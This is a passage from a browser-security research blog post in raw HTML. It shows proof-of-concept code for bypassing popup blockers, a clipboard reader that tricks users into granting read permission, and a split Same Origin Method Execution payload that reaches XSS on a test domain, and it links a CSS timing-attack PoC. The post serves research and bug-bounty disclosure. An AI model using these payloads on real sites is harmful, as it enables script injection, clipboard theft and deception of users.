function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> <span class="title function_">simulateClick</span>());</span></span><br><span class="line"><span class="language-javascript"><span class="number">30</span>          &#125; </span></span><br><span class="line"><span class="language-javascript"><span class="number">31</span>      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">32  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">33 <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>line 12: A click event is added to the page, where it waits for the user’s initial click</li>
<li>line 13 &amp; 14: setTimeout is defined, where it is possible to create a timing for the opening of the windows. Then the first popup is opened, via <code>window.open()</code></li>
<li>line 18: The <code>simulateClick</code> function is defined</li>
<li>line 19 &amp; 20: The <code>evt</code> variable is assigned a mouse click event. we set the <code>bubble: true</code> to create an automatic effect to pass through the parent elements.</li>
<li>line 23: The event that was created in the previous lines is added to the <code>checkbox</code></li>
<li>line 27: <code>num_popups</code> is the number of popups that will be opened.</li>
<li>line 29: A listener event is added by a click inside the id button, if this event is heard, the <code>simulateClick</code> will be triggered and will enter an event loop.</li>
</ul>
<h2 id="Little-Technique"><a href="#Little-Technique" class="headerlink" title="Little Technique"></a>Little Technique</h2><p>There is a technique that I didn’t go into, but that I see potential, which is the browser’s clipboard reader. There is no security feature that prevents writing to a clipboard, however, there is a security feature to not allow a page to read the user’s clipboard. When using <code>navigator.clipboard.readText()</code>, a window in the left corner of the browser is opened, asking the same question as when entering a website that requires the use of a camera or microphone.<br>This is not new, but it is possible to deceive the user in a way that makes them click to allow the read of the clipboard (deceiving the user instead of the browser).</p>
<p><code>reader.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>clipboard reader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span> <span class="attr">id</span>=<span class="string">output</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">	navigator.<span class="property">clipboard</span>.<span class="title function_">readText</span>().<span class="title function_">then</span>(</span></span><br><span class="line"><span class="language-javascript">  <span class="function"><span class="params">clipText</span> =&gt;</span> output.<span class="property">innerText</span> = clipText);</span></span><br><span class="line"><span class="language-javascript">&#125;,<span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>The above code will read your clipboard (first the webpage will ask you to accept the reader) and write into the <code>&lt;pre&gt;</code>.</p>
<hr>
<h1 id="SOME-Attack"><a href="#SOME-Attack" class="headerlink" title="SOME Attack"></a>SOME Attack</h1><p>SOME Attack is an attack that was introduced in 2014, by researcher Ben Hayak. There is a great white paper written by him on the attack <a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf</a>. The concept of the attack is cool but nowadays it is difficult to find scenarios where you can exploit it, however, they have already been found in the past.</p>
<blockquote>
<p>Same Origin Method Execution (SOME) is a web application attack that allows hijacking the execution of Web-Application “Document-Object-Module” and&#x2F;or scripting methods on behalf of users. In the SOME attack, the victim initially visits a malicious link or is lured by a malicious advertisement. Subsequently, an unlimited predefined set of actions is executed by the victim’s user agent (as in an XSS attack). By abusing the victim’s session, SOME can perform actions exactly as if the victim has triggered them on his or her own. Unlike many other similar attacks, SOME neither requires tricking the user into clicking on hidden objects, nor is confined in terms of user interaction, browser brand, frame busting, HTTP X-FRAME-OPTIONS&#x2F;Other response headers or a particular web-page. In fact, when a web-page is found vulnerable to SOME, the entire domain becomes exposed to its resulting vulnerabilities.” (<a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/About">https://www.someattack.com/Playground/About</a>)</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://twitter.com/kinugawamasato">Masato</a> have created an awesome challenge in the past using <code>SOME</code> attack, so I decided to use his challenge to create my PoC joining <code>SOME</code> and <code>Pop-Ups</code>.</p>
<h2 id="SOME-with-popup-blocking-bypass"><a href="#SOME-with-popup-blocking-bypass" class="headerlink" title="SOME with popup blocking bypass"></a>SOME with popup blocking bypass</h2><p>The version of the code for popups is not as beautiful as the version via iframe but it works the same. There are two ways to make this attack work with popups, the ugly and boring version to do and the beautiful and quick version to do, but the moment I created the proof of concept I ended up making the ugly and boring version.</p>
<h3 id="Ugly-version"><a href="#Ugly-version" class="headerlink" title="Ugly version"></a>Ugly version</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">name</span>=<span class="string">&quot;alert(document.domain)&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        w1 = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:81/simple_case.html&#x27;</span>);         </span></span><br><span class="line"><span class="language-javascript">        w2 = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:81/simple_case2.html&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        w3 = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:81/simple_case3.html&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        w4 = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:81/simple_case4.html&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        w5 = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:81/simple_case5.html&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        w6= <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;about:blank&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            location=<span class="string">&quot;http://vulnerabledoma.in/xss_2020-06/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;,<span class="number">50</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Each simple_case <code>[0-9].html</code> file basically has a part of the payload that was used in the proof of concept with iframes. Below is the code used to do the exploration with the ugly code:</p>
<p><code>simple_case.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            opener.<span class="property">location</span>=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/?code=&lt;script&gt;/*%26callback=opener.document.write&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/aUk1aS9.gif"></p>
<h3 id="Pretty-version"><a href="#Pretty-version" class="headerlink" title="Pretty version"></a>Pretty version</h3><p>The beautiful version is simpler and does not require several different files. I don’t know exactly why I did the first one that way, but I feel that at the time I just wanted to make it work with popups and the previous way was the first one I thought of. The result of the following code is the same, with no changes in the way it will be executed.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(name == <span class="string">&#x27;w1&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/?code=&lt;script&gt;/*%26callback=opener.document.write&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(name == <span class="string">&#x27;w2&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/?code=*/eval(/*%26callback=opener.document.write&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">1800</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(name == <span class="string">&#x27;w3&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/?code=*/name);//%26callback=opener.document.write&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">2600</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(name == <span class="string">&#x27;w4&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/?code=//xxxx%26callback=opener.document.write&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">3100</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(name == <span class="string">&#x27;w5&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/?code=&lt;\/script&gt;%26callback=opener.document.write&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">4100</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">name</span>=<span class="string">&quot;alert(document.domain)&quot;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost/some-popups.html&#x27;</span>,<span class="string">&#x27;w1&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost/some-popups.html&#x27;</span>,<span class="string">&#x27;w2&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost/some-popups.html&#x27;</span>,<span class="string">&#x27;w3&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost/some-popups.html&#x27;</span>,<span class="string">&#x27;w4&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost/some-popups.html&#x27;</span>,<span class="string">&#x27;w5&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;about:blank&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            location=<span class="string">&quot;https://vulnerabledoma.in/xss_2020-06/&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>I chose to use the name of the windows to classify which part of the payload the <code>PoC</code> is in, so I defined <code>w[0-9]</code> and for each of them there is a <code>if</code> condition to redirect the window to the required part of the payload to get <code>XSS</code>.</p>
<hr>
<h1 id="CSS-Timing-Attack"><a href="#CSS-Timing-Attack" class="headerlink" title="CSS Timing Attack"></a>CSS Timing Attack</h1><h2 id="Basic-of-the-attack"><a href="#Basic-of-the-attack" class="headerlink" title="Basic of the attack"></a>Basic of the attack</h2><p>Some time ago I developed a solution to the problem presented at <a target="_blank" rel="noopener" href="https://blog.sheddow.xyz/css-timing-attack/">this blog post</a>. In the original case, the exploitation of the <code>CSS Timing attack </code>was being done via iframes, but in cases where the page contains <code>X-Frame-Options</code>, much of the logic needs to be changed for it to work properly.</p>
<h2 id="CSS-Timing-Attack-with-Popups"><a href="#CSS-Timing-Attack-with-Popups" class="headerlink" title="CSS Timing Attack with Popups"></a>CSS Timing Attack with Popups</h2><p>The attack consists of generating timing variances within a vulnerable page, where the  timing difference will serve to predict what data is in a certain attribute of the page’s HTML. For this, <code>:has</code> is used, as<code>:has</code> enters the<code>HTML</code> tree, and if you pass <code>:has</code> multiple times, it will, several times, enter the<code> HTML</code> tree, generating a timing to find the attribute and its value. The sink for this to happen is through the expression <code>$()</code>, where inside it there will be a <code>#</code>, for example:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#&quot;</span>+userInput); or $(userInput)</span><br></pre></td></tr></table></figure>

<p><code>UserInput</code> in most cases is a variable that contains the value of<code> location.hash</code>, so it is also possible to come across cases like <code>$ (location.hash)</code> because the <code>#</code> remains in the call to <code>location.hash</code>.</p>
<p>The code presented in the following link represents the exploitation of a <code>CSS Timing Attack</code> in a scenario where it is not possible to place the target page in an iframe, therefore requiring the use of new windows:</p>
<h4 id="PoC-CSS-Timing-attack"><a href="#PoC-CSS-Timing-attack" class="headerlink" title="PoC CSS Timing attack"></a><a target="_blank" rel="noopener" href="https://gist.github.com/keerok/b55462036212863b8faa0567b499b49d">PoC CSS Timing attack</a></h4><p>In addition to the need to open new windows, one of the problems faced in this case (related to the application itself) is knowing whether the window has finished loading or not, so <code>window.length</code>.  In the case of the PoC above, window.length was used, because during the tests performed on the web application it was discovered that there was an iframe being loaded after the css timing attack. Frame counting is an <code>XS-Leaks</code> technique (<a target="_blank" rel="noopener" href="https://xsleaks.com/">https://xsleaks.com/</a>) as already mentioned.</p>
<p>The code of the <code>CSS timing attack</code> attached above needs two changes to be used, the simplest is in <code>HOST</code>, it is necessary to change the word HOST to the vulnerable url. The second change that needs to be made is in <code>setTimeout(() =&gt; &#123;resolve (&#123;status: true, leak: letter&#125;)&#125;, 50);</code> where it is necessary to change the 50 to the most suitable milliseconds for your attack (remember that you need to adapt this milliseconds with your network connection).</p>
<hr>
<h2 id="Conclusion-amp-Further-Investigations"><a href="#Conclusion-amp-Further-Investigations" class="headerlink" title="Conclusion &amp; Further Investigations"></a>Conclusion &amp; Further Investigations</h2><p>At the end of the research, just by using some of the techniques for upgrading <code>self-xss</code> shown previously I got a total of $2000 dollars in bounties with a total of 7 XSS reported.<br>A good line of research to follow on this subject are the new security features that browsers are launching to end <code>XSLeaks</code> attacks, such as the <code>window Opener policy</code>, <code>referrer policy</code>.</p>
<hr>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a target="_blank" rel="noopener" href="https://blog.sheddow.xyz/css-timing-attack/">https://blog.sheddow.xyz/css-timing-attack/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=OvarkOxxdic">https://www.youtube.com/watch?v=OvarkOxxdic</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=UfYfID_r7-U">https://www.youtube.com/watch?v=UfYfID_r7-U</a></li>
<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf</a></li>
<li><a target="_blank" rel="noopener" href="https://youtu.be/OvarkOxxdic">https://youtu.be/OvarkOxxdic</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a></li>
<li><a target="_blank" rel="noopener" href="https://xsleaks.com/">https://xsleaks.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=l3yThCIF7e4">https://www.youtube.com/watch?v=l3yThCIF7e4</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@renwa/copy-drag-paste-drop-2fd4613ad1d1">https://medium.com/@renwa/copy-drag-paste-drop-2fd4613ad1d1</a></li>
<li><a target="_blank" rel="noopener" href="https://research.securitum.com/the-curious-case-of-copy-paste/">https://research.securitum.com/the-curious-case-of-copy-paste/</a></li>
</ol>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Concepts"><span class="toc-number">2.</span> <span class="toc-text">Concepts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Popup-blocking"><span class="toc-number">2.1.</span> <span class="toc-text">Popup blocking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">Example 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popunder"><span class="toc-number">2.3.</span> <span class="toc-text">Popunder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Others"><span class="toc-number">2.4.</span> <span class="toc-text">Others</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Browsers-Behaviors"><span class="toc-number">3.</span> <span class="toc-text">Browsers Behaviors</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome-amp-Firefox-First-case"><span class="toc-number">3.1.</span> <span class="toc-text">Chrome &amp; Firefox - First case</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chrome-amp-Firefox-second-case"><span class="toc-number">4.</span> <span class="toc-text">Chrome &amp; Firefox - second case</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Firefox-Only-Third-case"><span class="toc-number">5.</span> <span class="toc-text">Firefox Only - Third case</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome-amp-Firefox-Fourth-case"><span class="toc-number">5.1.</span> <span class="toc-text">Chrome &amp; Firefox - Fourth case</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Self-XSS-to-Good-XSS-in-imgur-com"><span class="toc-number">6.</span> <span class="toc-text">Self-XSS to Good-XSS in imgur.com</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#self-xss-in-Imgur"><span class="toc-number">6.1.</span> <span class="toc-text">self-xss in Imgur</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-XFO-Application-Context"><span class="toc-number">6.2.</span> <span class="toc-text">Bypass XFO (Application Context)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Frame-Counting"><span class="toc-number">6.3.</span> <span class="toc-text">Frame Counting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ondrag-here-too"><span class="toc-number">6.4.</span> <span class="toc-text">ondrag here too</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Clipboard-Trick"><span class="toc-number">6.5.</span> <span class="toc-text">Clipboard Trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PopUnders"><span class="toc-number">6.6.</span> <span class="toc-text">PopUnders</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-PopUp-Blocking"><span class="toc-number">6.7.</span> <span class="toc-text">Bypass PopUp Blocking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Little-Technique"><span class="toc-number">6.8.</span> <span class="toc-text">Little Technique</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SOME-Attack"><span class="toc-number">7.</span> <span class="toc-text">SOME Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SOME-with-popup-blocking-bypass"><span class="toc-number">7.1.</span> <span class="toc-text">SOME with popup blocking bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ugly-version"><span class="toc-number">7.1.1.</span> <span class="toc-text">Ugly version</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pretty-version"><span class="toc-number">7.1.2.</span> <span class="toc-text">Pretty version</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSS-Timing-Attack"><span class="toc-number">8.</span> <span class="toc-text">CSS Timing Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-of-the-attack"><span class="toc-number">8.1.</span> <span class="toc-text">Basic of the attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSS-Timing-Attack-with-Popups"><span class="toc-number">8.2.</span> <span class="toc-text">CSS Timing Attack with Popups</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC-CSS-Timing-attack"><span class="toc-number">8.2.0.1.</span> <span class="toc-text">PoC CSS Timing attack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion-amp-Further-Investigations"><span class="toc-number">8.3.</span> <span class="toc-text">Conclusion &amp; Further Investigations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">8.4.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&text=Pop-Ups in a Good-World"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&is_video=false&description=Pop-Ups in a Good-World"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pop-Ups in a Good-World&body=Check out this article: http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&name=Pop-Ups in a Good-World&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&t=Pop-Ups in a Good-World"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
